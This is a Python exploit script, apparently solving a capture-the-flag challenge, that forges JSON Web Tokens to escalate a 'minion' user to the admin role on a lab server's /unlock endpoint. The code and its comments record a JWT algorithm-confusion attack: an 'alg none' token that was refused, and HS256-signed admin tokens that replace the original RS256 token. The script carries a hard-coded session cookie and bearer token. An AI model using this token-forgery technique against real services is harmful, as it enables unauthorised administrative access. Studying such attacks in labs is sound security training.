import requests

cookies = {
    '__cfduid': 'd12cf865aba76909cfdd8faf4e84d6f2d1607044540',
}

Alg = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzA5MjE1OX0.AxGuD9eJAZ1pGDqAX3Ijzu7SLd5L5YTNc3xChX3Zm0Q'

headers = {
    'Connection': 'keep-alive',
    'Authorization': 'Bearer ' + Alg,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
    'Accept': '*/*',
    'Referer': 'http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/',
    'Accept-Language': 'en-US,en;q=0.9',
    'If-None-Match': 'W/"2c-HIo8OazkINs/Y63UTfaXAuuMrWk"',
}

response = requests.get('http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/unlock', headers=headers, cookies=cookies, verify=False)

print(response.content)

# eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjA3MDkyMTU5fQ.nxMapjtb54d754QNfftaaxJT4pMwG7VbzYB94WMs573ZanIZmw2GdnaNhAAUqQZ93d8Fv8WuivhNtcELRvdvWcKAtvPn5RSGZO4PDEvufwBKoLdOjDJoET7Hp5HzzWMseTxx-LKE84_AvHrnFCmCxXQtblkbnYlW0WQ8B0BNOJ5TNRnhoBFucSYf6S_x5q3lm2dQ4AzyNyPEE60i9f-71WfwicDHZY4uXGNJC2_Dj30hyU_-tm2OpJbgrHA8DkFwEGVgL_eI53KhkmTMENm4a9OJ2s5BSCuEk7NPG8qL-cnmgIczkYtx_faDZ4M1v-S_uIOHYJwVcEePWZgxQhIGXSh1iHAmRPkbwcfLelIRC5JWoeepvNaoj5mkoOcmLGYC_vsf_ssTYhXh8s062CaIgtW7aylFbcDEREYwMjiiIWKfKkqVwNF2K1ZRBOJ8FxkeFp9hBSDBRpeqx0sGi80Rv6vE9dCYknVkhyLSch21iceOgU2ATd90_e6b5RIiqd_Izw4WM41aeAlMAxnWWDcEo2ldaYjRtc7dxeU5WjYVxAmuS4JIHLdbGSF4OZL1fg1Q04mIZcDRGFq5DfoMT-N0nPsSdEI8iCZqQzCp9ubs7YkQf6KO9fCAvziJtnPP5--E98b9HUJ-288M5XF5rlLLIXyYHKAm6VREzJVfUr350OQ
# ''

# Alg none User admin
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzA5MjE1OX0.nxMapjtb54d754QNfftaaxJT4pMwG7VbzYB94WMs573ZanIZmw2GdnaNhAAUqQZ93d8Fv8WuivhNtcELRvdvWcKAtvPn5RSGZO4PDEvufwBKoLdOjDJoET7Hp5HzzWMseTxx-LKE84_AvHrnFCmCxXQtblkbnYlW0WQ8B0BNOJ5TNRnhoBFucSYf6S_x5q3lm2dQ4AzyNyPEE60i9f-71WfwicDHZY4uXGNJC2_Dj30hyU_-tm2OpJbgrHA8DkFwEGVgL_eI53KhkmTMENm4a9OJ2s5BSCuEk7NPG8qL-cnmgIczkYtx_faDZ4M1v-S_uIOHYJwVcEePWZgxQhIGXSh1iHAmRPkbwcfLelIRC5JWoeepvNaoj5mkoOcmLGYC_vsf_ssTYhXh8s062CaIgtW7aylFbcDEREYwMjiiIWKfKkqVwNF2K1ZRBOJ8FxkeFp9hBSDBRpeqx0sGi80Rv6vE9dCYknVkhyLSch21iceOgU2ATd90_e6b5RIiqd_Izw4WM41aeAlMAxnWWDcEo2ldaYjRtc7dxeU5WjYVxAmuS4JIHLdbGSF4OZL1fg1Q04mIZcDRGFq5DfoMT-N0nPsSdEI8iCZqQzCp9ubs7YkQf6KO9fCAvziJtnPP5--E98b9HUJ-288M5XF5rlLLIXyYHKAm6VREzJVfUr350OQ
# Forbidden

# Alg HS256 User admin
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzA5MjE1OX0.nxMapjtb54d754QNfftaaxJT4pMwG7VbzYB94WMs573ZanIZmw2GdnaNhAAUqQZ93d8Fv8WuivhNtcELRvdvWcKAtvPn5RSGZO4PDEvufwBKoLdOjDJoET7Hp5HzzWMseTxx-LKE84_AvHrnFCmCxXQtblkbnYlW0WQ8B0BNOJ5TNRnhoBFucSYf6S_x5q3lm2dQ4AzyNyPEE60i9f-71WfwicDHZY4uXGNJC2_Dj30hyU_-tm2OpJbgrHA8DkFwEGVgL_eI53KhkmTMENm4a9OJ2s5BSCuEk7NPG8qL-cnmgIczkYtx_faDZ4M1v-S_uIOHYJwVcEePWZgxQhIGXSh1iHAmRPkbwcfLelIRC5JWoeepvNaoj5mkoOcmLGYC_vsf_ssTYhXh8s062CaIgtW7aylFbcDEREYwMjiiIWKfKkqVwNF2K1ZRBOJ8FxkeFp9hBSDBRpeqx0sGi80Rv6vE9dCYknVkhyLSch21iceOgU2ATd90_e6b5RIiqd_Izw4WM41aeAlMAxnWWDcEo2ldaYjRtc7dxeU5WjYVxAmuS4JIHLdbGSF4OZL1fg1Q04mIZcDRGFq5DfoMT-N0nPsSdEI8iCZqQzCp9ubs7YkQf6KO9fCAvziJtnPP5--E98b9HUJ-288M5XF5rlLLIXyYHKAm6VREzJVfUr350OQ

# HS256
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzA5MjE1OX0.AxGuD9eJAZ1pGDqAX3Ijzu7SLd5L5YTNc3xChX3Zm0Q
